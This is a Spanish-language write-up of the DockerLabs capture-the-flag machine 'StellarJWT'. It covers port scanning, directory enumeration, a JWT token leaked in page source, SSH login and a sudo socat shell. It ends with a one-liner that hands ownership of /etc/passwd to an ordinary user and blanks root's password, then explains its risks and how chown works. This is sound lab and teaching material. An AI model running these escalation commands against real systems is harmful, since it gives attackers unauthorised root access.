---
title: STELLARJWT
excerpt: WritheUp maquina de DockerLabs
publishDate: 'Nov 01 2024'
isFeatured: true
tags:
  - Web
  - Guide
  - CTF
  - Dockerlabs
seo:
  image:
    src: ''
    alt: Wavy lines
---




<img src="/20241101221727.png" alt="Texto alternativo" />

---
# Puertos:

Comando:

```
nmap -sSCV -p- --open --min-rate 5000 172.17.0.2 -Pn -n -vvv
```

- 22 SSH
- 80 HTTP

<img src="/20241101201603.png" alt="Texto alternativo" />

---

# Web:

Comamndo:

```
gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js
```

- `index.html`
- `/universe`

<img src="/20241101201722.png" alt="Texto alternativo" />

---

# Credenciales Encontradas:

Codigo fuente pagina /universe/

<img src="/20241101213617.png" alt="Texto alternativo" />

**Token**
  ```plaintext
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE
  ```



<img src="/20241101213950.png" alt="Texto alternativo" />

- **Usuario**: neptuno 

- **Contraseña**: Gottfried (Encontrado por pistas en la web)



<img src="/20241101214226.png" alt="Texto alternativo" />

---


# Ingresamos por SSH


Usuarios en servidor:

- root
- elite
- nasa
- neptuno

# Escalada:

- **Usuario**: nasa

  *Cree un diccionario personalizado con todos los datos que podrían ser importantes y sirvió para encontrar la contraseña de nasa*

- **Contraseña**: Eisenhower

<img src="/20241101202626.png" alt="Texto alternativo" />

```bash
sudo -l
```



<img src="/20241101202942.png" alt="Texto alternativo" />


# Comando de Socat

```bash
sudo -u elite socat stdin exec:/bin/bash
```

Ahora somos usuario elite



<img src="/20241101204020.png" alt="Texto alternativo" />



# Abuso del binario chown


Usaremos el siguiente comando:

```bash
sudo chown elite:elite /etc/ && sudo chown elite:elite /etc/passwd && echo "$(cat /etc/passwd | sed 's/root:x:/root::/g')" > /etc/passwd && su
```



<img src="/20241101204213.png" alt="Texto alternativo" />

## Exito!

----

## Explicación del Comando

Este conjunto de comandos tiene la intención de alterar permisos y modificar el archivo del sistema `/etc/passwd`, que contiene información de usuarios en un sistema Linux. Vamos a desglosar cada parte para entender qué hace y qué riesgos implica.

1. <p style="color: red;">sudo chown elite:elite /etc/ && sudo chown elite:elite /etc/passwd</p>  
   Estos comandos cambian el propietario y el grupo del directorio `/etc/` y del archivo `/etc/passwd` a `elite:elite`.  

   
   
   - **`chown elite:elite /etc/`**: Cambia el propietario y el grupo de todo el directorio `/etc/`, que es un directorio crítico en el sistema Linux, ya que contiene configuraciones del sistema y archivos esenciales.
   - **`chown elite:elite /etc/passwd`**: Cambia el propietario y el grupo del archivo `/etc/passwd`. Este archivo debe ser propiedad de `root` y estar protegido contra modificaciones por usuarios normales. Cambiar su propietario a un usuario no privilegiado representa un grave riesgo de seguridad, pues permite a un usuario modificar directamente este archivo.

2. <p style="color: red;">echo "$(cat /etc/passwd | sed 's/root:x:/root::/g')" > /etc/passwd</p>
   Este comando modifica el archivo `/etc/passwd` para eliminar la contraseña del usuario `root`.

   - **`cat /etc/passwd | sed 's/root:x:/root::/g'`**: Lee el archivo `/etc/passwd` y usa `sed` para reemplazar la entrada `root:x:` con `root::`. Esto elimina la marca `x`, que indica la existencia de una contraseña para el usuario `root`. En su lugar, `root::` significa que el usuario `root` no tiene contraseña, permitiendo iniciar sesión como `root` sin necesidad de ella.
   - **`echo "$( ... )" > /etc/passwd`**: Sobrescribe el archivo `/etc/passwd` con esta modificación, lo que permite un acceso sin contraseña al usuario `root`.

3. <p style="color: red;">su</p> 
   Este comando intenta cambiar al usuario `root`. Dado que la contraseña ha sido eliminada en el paso anterior, permite obtener acceso a `root` sin necesidad de ingresar ninguna clave.

## Riesgos y Consecuencias
Este conjunto de comandos compromete gravemente la seguridad del sistema al:
- Permitir que el usuario `elite` modifique configuraciones críticas en `/etc/`.
- Eliminar la contraseña de `root`, permitiendo que cualquiera en el sistema obtenga acceso de superusuario sin autenticación.

Este tipo de manipulación es potencialmente destructiva y peligrosa. En un entorno de producción o en un sistema compartido, estos cambios pueden dar a un atacante control total del sistema, y es una práctica maliciosa a evitar absolutamente en entornos seguros.

---

# El binario chown

El comando `chown` en Linux (abreviación de *change owner*) se utiliza para cambiar el propietario y/o el grupo de un archivo o directorio. Este comando es esencial para gestionar los permisos y la propiedad de archivos en sistemas Unix y Linux, donde cada archivo tiene un propietario y un grupo asociados, y los permisos de acceso se basan en estos atributos.

## Sintaxis de chown

La estructura básica del comando `chown` es la siguiente:

```bash
chown [opciones] propietario[:grupo] archivo
```

- **`propietario`**: El nuevo propietario del archivo o directorio.
- **`grupo`**: El nuevo grupo del archivo o directorio (opcional). Para especificar solo el grupo y mantener el mismo propietario, usa `:grupo` sin `propietario`.
- **`archivo`**: El archivo o directorio al que se le desea cambiar la propiedad.

## Ejemplos de Uso

1. **Cambiar el propietario de un archivo**:
   ```bash
   chown usuario archivo.txt
   ```
   Esto cambia el propietario de `archivo.txt` a `usuario` y mantiene el grupo sin cambios.

2. **Cambiar tanto el propietario como el grupo**:
   ```bash
   chown usuario:grupo archivo.txt
   ```
   Esto cambia el propietario a `usuario` y el grupo a `grupo`.

3. **Cambiar el grupo solamente**:
   ```bash
   chown :grupo archivo.txt
   ```
   Esto cambia solo el grupo de `archivo.txt` y mantiene el mismo propietario.

4. **Cambiar propietario y grupo recursivamente**:
   ```bash
   chown -R usuario:grupo /ruta/directorio
   ```
   La opción `-R` (recursivo) aplica el cambio de propiedad a todos los archivos y subdirectorios dentro de `/ruta/directorio`.

## Opciones Comunes

- **`-R`**: Aplica el cambio de propietario y/o grupo de manera recursiva a todos los archivos y directorios dentro de un directorio especificado.
- **`-v`**: Muestra un mensaje detallado para cada archivo o directorio que modifica, útil para verificar cambios.
- **`--reference=archivo`**: Cambia la propiedad del archivo especificado usando como referencia otro archivo. Por ejemplo:
  ```bash
  chown --reference=ejemplo.txt archivo.txt
  ```
  Esto hace que `archivo.txt` tenga el mismo propietario y grupo que `ejemplo.txt`.


